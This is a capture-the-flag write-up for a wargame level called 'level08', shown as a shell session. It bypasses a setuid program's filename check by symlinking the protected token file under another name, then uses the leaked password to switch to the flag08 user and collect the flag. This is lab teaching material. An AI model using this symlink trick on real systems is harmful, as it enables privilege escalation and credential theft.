# level08

```bash
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
$ ./level08
./level08 [file to read]
$ ./level08 token
You may not access 'token'
$ ./level08 .bashrc
level08: Unable to open .bashrc: Permission denied
$ ln -s /home/user/level08/token /tmp/flag
$ ls -l /tmp/flag
lrwxrwxrwx 1 level08 level08 24 Aug 10 02:34 /tmp/flag -> /home/user/level08/token
$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
